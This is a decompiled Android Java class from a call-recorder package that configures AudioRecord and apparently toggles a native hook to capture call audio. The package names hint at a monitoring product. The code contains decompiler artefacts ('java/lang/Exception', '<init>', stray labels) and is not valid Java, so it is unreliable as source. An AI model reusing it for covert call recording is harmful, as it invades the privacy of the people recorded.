package com.krecorder.call.callrecorder;

import android.media.AudioRecord;
import android.os.Handler;
import com.krecorder.call.recording.MediaFormat;
import com.vvt.ak.a;

public class e
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  private static int[] k;
  private AudioRecord c;
  private int d;
  private int e;
  private int f;
  private int g;
  private int h;
  private MediaFormat i;
  private boolean j;
  private boolean l;
  private boolean m;
  
  static
  {
    int[] arrayOfInt = new int[1];
    arrayOfInt[0] = 8000;
    k = arrayOfInt;
  }
  
  public e(int paramInt, MediaFormat paramMediaFormat)
  {
    int n = 100;
    if (paramInt != n)
    {
      n = 6;
      if (paramInt != n) {}
    }
    else
    {
      paramInt = 1;
    }
    this.i = paramMediaFormat;
    this.e = paramInt;
    this.l = false;
    this.j = false;
  }
  
  private void g()
  {
    NativeAosp.a(0);
  }
  
  private void h()
  {
    try
    {
      AudioRecord localAudioRecord = i();
      this.c = localAudioRecord;
      localAudioRecord = this.c;
      if (localAudioRecord != null)
      {
        this.l = true;
        return;
      }
    }
    catch (Exception localException1)
    {
      Exception localException2 = new java/lang/Exception;
      localObject = localException1.getMessage();
      localException2.<init>((String)localObject);
      throw localException2;
    }
    Object localObject = new java/lang/Exception;
    ((Exception)localObject).<init>("Cannot initialize the AudioRecord object.");
    throw ((Throwable)localObject);
  }
  
  private AudioRecord i()
  {
    int n = 1;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = "=";
    int[] arrayOfInt = k;
    int i7 = arrayOfInt.length;
    int i8 = 0;
    Object localObject2 = localObject1;
    int i9;
    Object localObject3;
    int i10;
    int i3;
    if (i8 < i7)
    {
      int i1 = arrayOfInt[i8];
      this.h = i1;
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      i9 = this.h;
      localObject3 = String.valueOf(i9);
      localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
      localObject3 = "hz";
      ((StringBuilder)localObject1).append((String)localObject3).toString();
      localObject1 = "CHANNEL_IN_MONO";
      boolean bool2 = a;
      if (bool2) {}
      int i2 = this.h;
      i9 = this.f;
      i10 = this.g;
      i2 = AudioRecord.getMinBufferSize(i2, i9, i10);
      this.d = i2;
      boolean bool3 = a;
      if (bool3) {}
      i3 = this.d;
      if (i3 >= 0) {
        break label660;
      }
      i9 = n;
    }
    for (;;)
    {
      int i11;
      label186:
      label254:
      MediaFormat localMediaFormat;
      int i4;
      if (i9 == 0)
      {
        i10 = this.h * 100 / 1000;
        i3 = this.f;
        i11 = 16;
        if (i3 == i11)
        {
          i3 = n;
          i10 = i10 * 2 * i3 * 16 / 8;
          i11 = this.d;
          if (i10 >= i11) {
            break label367;
          }
          i10 = this.d;
          i3 = i3 * 32 / 8;
          i3 = i10 / i3;
          this.d = i10;
          boolean bool4 = a;
          if (bool4) {}
          bool4 = a;
          if (bool4) {}
          localObject1 = this.i;
          localMediaFormat = MediaFormat.AAC;
          if (localObject1 != localMediaFormat) {
            break label376;
          }
          bool4 = a;
          if (bool4) {}
          i4 = 2048;
          this.d = i4;
        }
      }
      else
      {
        label287:
        if (i9 == 0) {
          break label454;
        }
        i4 = this.d;
        i9 = -1;
        if (i4 != i9) {
          break label448;
        }
      }
      label367:
      label376:
      label448:
      for (localObject1 = "ERROR (Unable to query hardware)";; localObject1 = "ERROR_BAD_VALUE (Parameters not supported by hardware)")
      {
        boolean bool5 = a;
        if (bool5) {}
        localObject1 = new java/lang/StringBuilder;
        ((StringBuilder)localObject1).<init>();
        localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
        localObject3 = "=";
        localObject1 = (String)localObject3;
        i9 = i8 + 1;
        i8 = i9;
        localObject2 = localObject1;
        break;
        int i5 = 2;
        break label186;
        this.d = i10;
        break label254;
        localObject1 = this.i;
        localMediaFormat = MediaFormat.AMR;
        if (localObject1 != localMediaFormat) {
          break label287;
        }
        i5 = this.d % 320;
        if (i5 == 0) {
          break label287;
        }
        i5 = Math.abs(this.d % 320 + 65216);
        i10 = this.d;
        i5 += i10;
        this.d = i5;
        boolean bool6 = a;
        if (!bool6) {
          break label287;
        }
        break label287;
      }
      for (;;)
      {
        try
        {
          label454:
          localObject1 = new android/media/AudioRecord;
          i9 = this.e;
          i10 = this.h;
          i11 = this.f;
          int i12 = this.g;
          int i13 = this.d;
          ((AudioRecord)localObject1).<init>(i9, i10, i11, i12, i13);
          this.c = ((AudioRecord)localObject1);
          localObject1 = this.c;
          int i6 = ((AudioRecord)localObject1).getState();
          if (i6 == n)
          {
            localObject1 = this.c;
            return (AudioRecord)localObject1;
          }
          bool7 = a;
          if (bool7) {}
          localObject1 = this.c;
          ((AudioRecord)localObject1).release();
          bool7 = false;
          localObject1 = null;
          this.c = null;
          localObject1 = new java/lang/StringBuilder;
          ((StringBuilder)localObject1).<init>();
          localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
          localObject3 = "=";
          localObject1 = (String)localObject3;
        }
        catch (Exception localException1) {}
        try
        {
          localObject3 = this.c;
          if (localObject3 != null)
          {
            localObject3 = this.c;
            ((AudioRecord)localObject3).release();
            i9 = 0;
            localObject3 = null;
            this.c = null;
          }
        }
        catch (Exception localException2)
        {
          String str;
          for (;;) {}
        }
        localObject3 = new java/lang/Exception;
        str = localException1.getMessage();
        ((Exception)localObject3).<init>(str);
        throw ((Throwable)localObject3);
        boolean bool7 = a;
        if (bool7) {}
        bool7 = false;
        str = null;
      }
      label660:
      i9 = 0;
      Object localObject4 = null;
    }
  }
  
  public int a()
  {
    return this.h;
  }
  
  public void a(Handler paramHandler)
  {
    int n = 1;
    Object localObject1;
    if (paramHandler == null)
    {
      localObject1 = new java/lang/Exception;
      ((Exception)localObject1).<init>("Invalid buffering handler");
      throw ((Throwable)localObject1);
    }
    this.m = n;
    try
    {
      localObject1 = this.c;
      ((AudioRecord)localObject1).startRecording();
      n = this.j;
      if (n != 0)
      {
        n = 1;
        NativeAosp.a(n);
        long l1 = 1500L;
        Thread.sleep(l1);
        i1 = this.d;
        localObject1 = new byte[i1];
        localObject2 = this.c;
        int i2 = this.d;
        ((AudioRecord)localObject2).read((byte[])localObject1, 0, i2);
      }
      int i1 = 0;
      localObject1 = null;
      paramHandler.sendEmptyMessage(0);
      boolean bool = a;
      if (bool) {}
      return;
    }
    catch (Exception localException)
    {
      this.m = false;
      Object localObject2 = new java/lang/Exception;
      String str = localException.getMessage();
      ((Exception)localObject2).<init>(str);
      throw ((Throwable)localObject2);
    }
  }
  
  public void a(boolean paramBoolean)
  {
    this.j = paramBoolean;
    this.f = 16;
    int n = 2;
    this.g = n;
    if (!paramBoolean) {
      h();
    }
    for (;;)
    {
      return;
      g();
      long l1 = 500L;
      Thread.sleep(l1);
      h();
    }
  }
  
  public int b()
  {
    return this.d;
  }
  
  public AudioRecord c()
  {
    return this.c;
  }
  
  public void d()
  {
    this.m = false;
    AudioRecord localAudioRecord = this.c;
    if (localAudioRecord != null) {}
    try
    {
      localAudioRecord = this.c;
      localAudioRecord.stop();
      localAudioRecord = this.c;
      localAudioRecord.release();
      localAudioRecord = null;
      this.c = null;
      return;
    }
    catch (Exception localException1)
    {
      Exception localException2 = new java/lang/Exception;
      String str = localException1.getMessage();
      localException2.<init>(str);
      throw localException2;
    }
  }
  
  public boolean e()
  {
    return this.m;
  }
  
  public void f()
  {
    boolean bool = this.l;
    AudioRecord localAudioRecord;
    if (bool)
    {
      bool = a;
      if (bool) {}
      localAudioRecord = this.c;
      if (localAudioRecord == null) {}
    }
    try
    {
      localAudioRecord = this.c;
      localAudioRecord.release();
      bool = false;
      localAudioRecord = null;
      this.c = null;
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/krecorder/call/callrecorder/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */